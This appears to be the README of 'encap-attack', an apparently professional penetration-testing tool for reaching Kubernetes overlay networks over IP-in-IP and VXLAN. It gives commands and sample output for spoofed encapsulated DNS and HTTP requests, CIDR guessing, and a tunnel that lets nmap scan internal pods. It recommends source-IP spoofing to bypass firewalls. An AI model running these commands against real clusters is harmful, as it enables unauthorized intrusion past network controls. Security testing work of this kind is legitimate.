# Encap-Attack: Encapsulated Network Attacks

Sniff and attack networks that use IP-in-IP or VXLAN encapsulation protocols.

## Requirements

- Python
- `ip`
- `iptables`

## Installation

```shell
pip3 install encap-attack
encap-attack --help
```

### Development installation

```shell
git clone https://github.com/WithSecureLabs/encap-attack.git
cd encap-attack
python3 -m venv venv
sudo su
source venv/bin/activate
pip3 install .
encap-attack --help
```

## Usage

Here are some basic usage examples of the tool. More options are available for each command and subcommand, documented by the `--help` options. For example, `encap-attack vxlan --help` or `encap-attack vxlan tunnel --help`.

All commands can be run in verbose mode using the `-v` flag after `encap-attack`. For example, `encap-attack -v detect`.

### Sniffing encapsulated network traffic - `detect`

The tool can listen for encapsulated traffic on the network, and extract information about the encapsulation being used. This will only return information if encapsulated traffic is detected, or if running in verbose mode. To sniff traffic, run:

```shell
encap-attack detect
```

### Obtain information about a Kubernetes cluster - `kubeintel`

Kubernetes intelligence functionality uses the `kubeintel` subcommand.

To extract a predicted service IP range and CoreDNS address, and optionally attempt to connect to it using IP-in-IP, two commands exist: `kubeintel guess-cidr` and `kubeintel attempt-ipip`.

To guess the service CIDR:

```shell
encap-attack kubeintel guess-cidr <api_server_address>
```

To guess the service CIDR and attempt to connect to CoreDNS using IP-in-IP, run the following. We recommend spoofing the source IP as another host or Kubernetes node to bypass host firewall rules, using the `-s` flag:

```shell
encap-attack kubeintel attempt-ipip -a <api_server_address> -s <another_host_ip>
```

Example:

```shell
encap-attack kubeintel attempt-ipip -a 192.168.124.9 -s 192.168.124.11
```

The tool will also provide `kubectl` commands to extract pod/service IP ranges and VXLAN network information from a Kubernetes cluster, with `encap-attack kubeintel get-ip-ranges` and `encap-attack kubeintel get-net-info`, respectively. The `kubectl` commands provided will output the information needed to simulate encapsulated packets to the overlay network.

### Attack an IP-in-IP network - `ipip`

IP-in-IP functionality uses the `ipip` subcommand.

You must ensure the intermediary destination node (`-d` flag) is that on which the target pods reside. If the pods run on a different node, you will receive no response.

To send a single DNS request, run the following. We recommend spoofing the source IP as another host or Kubernetes node to bypass host firewall rules, using the `-s` flag:

```shell
encap-attack ipip -d <destination_host_ip> -s <another_host_ip> request -di <internal_destination_ip> dns -t <query_type> <domain_to_query>
```

Example:

```
# encap-attack ipip -d 192.168.124.9 -s 192.168.124.11 request -di 10.100.99.5 dns -t A kube-dns.kube-system.svc.cluster.local
Running in IP-in-IP mode

Interface IP: 192.168.124.200

Sending DNS packet: Ether / IP / IP / UDP / DNS Qry "b'kube-dns.kube-system.svc.cluster.local.'" 

Response:
  kube-dns.kube-system.svc.cluster.local: 10.96.0.10
```

For an HTTP request:

```shell
encap-attack ipip -d <destination_host_ip> -s <another_host_ip> request -di <internal_destination_ip> http "<request>"
```

Example:

```
# encap-attack ipip -d 192.168.124.10 -s 192.168.124.11 request -di 10.100.99.5 http "GET / HTTP/1.1\r\nHost: 10.100.99.5"
Running in IP-in-IP mode

Interface IP: 192.168.124.200

Sending SYN: Ether / IP / IP / TCP 192.168.124.200:28098 > 10.100.99.5:http S

Sending ACK: Ether / IP / IP / TCP 192.168.124.200:28098 > 10.100.99.5:http A

Sending ACK PUSH: Ether / IP / IP / TCP 192.168.124.200:28098 > 10.100.99.5:http PA / Raw

Sending ACK: Ether / IP / IP / TCP 192.168.124.200:28098 > 10.100.99.5:http A

Sending FIN ACK: Ether / IP / IP / TCP 192.168.124.200:28098 > 10.100.99.5:http FA

Sending ACK: Ether / IP / IP / TCP 192.168.124.200:28098 > 10.100.99.5:http A

Response:

HTTP/1.1 200 OK
Server: nginx/1.27.1
Date: Fri, 23 Aug 2024 10:35:13 GMT
Content-Type: text/html
Content-Length: 615
Last-Modified: Mon, 12 Aug 2024 14:21:01 GMT
Connection: keep-alive
ETag: "66ba1a4d-267"
Accept-Ranges: bytes


<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
</head>
<body>
<h1>Welcome!</h1>
</body>
</html>
```

Alternatively, a tunnel can be configured to route all traffic destined for specific IP ranges into the encapsulated network. The `-a` flag is optionally used to specify a Kubernetes API server. If this value is set, the API server will be queried to guess the service IP range (as per `kubeintel guess-cidr` above) - and this route will automatically be added to the tunnel. Additional routes can be added with the `-r` flag. Use Ctrl+C to shut down the tunnel.

```shell
encap-attack -d <destination_host_ip> -s <another_host_ip> tunnel -a <api_server_address> -r <route_cidr>
```

Example:

```
# encap-attack -d 192.168.124.10 -s 192.168.124.11 tunnel -a 192.168.124.9 -r 10.2.0.0/16 -r 10.3.0.0/16
Running in IP-in-IP mode

Interface IP: 192.168.124.200

Kubernetes API server certificate information:
  Subject: kube-apiserver
  Issuer: kubernetes
  IPs: 10.96.0.1, 192.168.124.9
  Hostnames: kubernetes, kubernetes.default, kubernetes.default.svc, kubernetes.default.svc.cluster.local, master

Guessed service CIDR: 10.96.0.0/12
kube-dns DNS server may be available at: 10.96.0.10:53
Cluster DNS suffix: cluster.local


Starting tunnel tun0, press Ctrl+C to stop...


Encapsulating packet: IP / UDP / DNS Qry "b'kube-dns.kube-system.svc.cluster.local.'"
Sending encapsulated packet: Ether / IP / IP / UDP / DNS Qry "b'kube-dns.kube-system.svc.cluster.local.'"
```

All requests to the defined routes (in this example, `10.2.0.0/16`, `10.3.0.0/16`, and the service IP range guessed from information from the API server - 10.96.0.0/12) will then be encapsulated and routed into the overlay network. This permits the use of other tooling (e.g., `nmap`) within the overlay network from an external perspective:

```shell
nmap -sT 10.2.0.0/16
```

### Attack a VXLAN network - `vxlan`

VXLAN functionality uses the `vxlan` subcommand.

The functionality for VXLAN networks is identical to that provided for IP-in-IP networks with the `ipip` command, but requires the additional information needed by the VXLAN protocol, as discussed above. Similar to IP-in-IP, you must ensure the correct destination host/node is used, or you will receive no response.

To send a single DNS request, run the following. We recommend spoofing the source IP as another host or Kubernetes node to bypass host firewall rules, using the `-s` flag:

```shell
encap-attack vxlan -d <destination_host_ip> -s <another_host_ip> -mi <vtep> --vni <vni> -pd <vxlan_tunnel_port> request -di <internal_destination_ip> dns -t <query_type> <domain_to_query>
```

Example:

```
# encap-attack ipip -d 192.168.124.9 -s 192.168.124.11 -mi aa:bb:cc:dd:ee:ff --vni 4096 -pd 4789 request -di 10.100.99.5 dns -t A kube-dns.kube-system.svc.cluster.local
Running in VXLAN mode

Interface IP: 192.168.124.200

Sending DNS packet: Ether / IP / UDP / VXLAN / Ether / IP / UDP / DNS Qry "b'kube-dns.kube-system.svc.cluster.local.'" 

Response:
  kube-dns.kube-system.svc.cluster.local: 10.96.0.10
```

For an HTTP request:

```shell
encap-attack ipip -d <destination_host_ip> -s <another_host_ip> -mi <vtep> --vni <vni> -pd <vxlan_tunnel_port> request -di <internal_destination_ip> http "<request>"
```

Example:

```
# encap-attack ipip -d 192.168.124.10 -s 192.168.124.11 -mi 99:aa:bb:cc:dd:ee --vni 4096 -pd 4789 request -di 10.100.99.5 http "GET / HTTP/1.1\r\nHost:10.100.99.5"
Running in VXLAN mode

Interface IP: 192.168.124.200

Sending SYN: Ether / IP / UDP / VXLAN / Ether / IP / TCP 192.168.124.200:28098 > 10.100.99.5:http S

Sending ACK: Ether / IP / UDP / VXLAN / Ether / IP / TCP 192.168.124.200:28098 > 10.100.99.5:http A

Sending ACK PUSH: Ether / IP / UDP / VXLAN / Ether / IP / TCP 192.168.124.200:28098 > 10.100.99.5:http PA / Raw

Sending ACK: Ether / IP / UDP / VXLAN / Ether / IP / TCP 192.168.124.200:28098 > 10.100.99.5:http A

Sending FIN ACK: Ether / IP / UDP / VXLAN / Ether / IP / TCP 192.168.124.200:28098 > 10.100.99.5:http FA

Sending ACK: Ether / IP / UDP / VXLAN / Ether / IP / TCP 192.168.124.200:28098 > 10.100.99.5:http A

Response:

HTTP/1.1 200 OK
Server: nginx/1.27.1
Date: Fri, 23 Aug 2024 10:35:13 GMT
Content-Type: text/html
Content-Length: 615
Last-Modified: Mon, 12 Aug 2024 14:21:01 GMT
Connection: keep-alive
ETag: "66ba1a4d-267"
Accept-Ranges: bytes


<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
</head>
<body>
<h1>Welcome!</h1>
</body>
</html>
```

The `vxlan` subcommand also provides a tunnel option, similar to the `ipip` subcommand, with the same functionality. As a reminder, this routes all traffic destined for specific IP ranges into the encapsulated network. The `-a` flag is optionally used to specify a Kubernetes API server. If this value is set, the API server will be queried to guess the service IP range (as per `kubeintel guess-cidr` above) - and this route will automatically be added to the tunnel. Additional routes can be added with the `-r` flag. Use Ctrl+C to shut down the tunnel.

```shell
encap-attack -d <destination_host_ip> -s <another_host_ip> -mi <vtep> --vni <vni> -pd <vxlan_tunnel_port> tunnel -a <api_server_address> -r <route_cidr>
```

Example:

```
# encap-attack -d 192.168.124.10 -s 192.168.124.11 -mi 99:aa:bb:cc:dd:ee --vni 4096 --pd 4789 tunnel -a 192.168.124.9 -r 10.2.0.0/16 -r 10.3.0.0/16
Running in VXLAN mode

Interface IP: 192.168.124.200

Kubernetes API server certificate information:
  Subject: kube-apiserver
  Issuer: kubernetes
  IPs: 10.96.0.1, 192.168.124.9
  Hostnames: kubernetes, kubernetes.default, kubernetes.default.svc, kubernetes.default.svc.cluster.local, master

Guessed service CIDR: 10.96.0.0/12
kube-dns DNS server may be available at: 10.96.0.10:53
Cluster DNS suffix: cluster.local


Starting tunnel tun0, press Ctrl+C to stop...


Encapsulating packet: IP / UDP / DNS Qry "b'kube-dns.kube-system.svc.cluster.local.'"
Sending encapsulated packet: Ether / IP / UDP / VXLAN / Ether / IP / UDP / DNS Qry "b'kube-dns.kube-system.svc.cluster.local.'"
```

All requests to the defined routes (in this example, `10.2.0.0/16`, `10.3.0.0/16`, and the service IP range guessed from information from the API server - `10.96.0.0/12`) will then be encapsulated and routed into the overlay network. This permits the usage of other tooling (e.g., `nmap`) within the overlay network from an external perspective:

```shell
nmap -sT 10.2.0.0/16
```

# Acknowledgements

This tool was initially developed by [Matthew Grove](https://github.com/mgrove36) at WithSecure Consulting.

It was inspired by research conducted by [Rory McCune](https://raesene.github.io/blog/2021/01/03/Kubernetes-is-a-router/) and [James Cleverley-Prance](https://www.youtube.com/watch?v=7iwnwbbmxqQ).
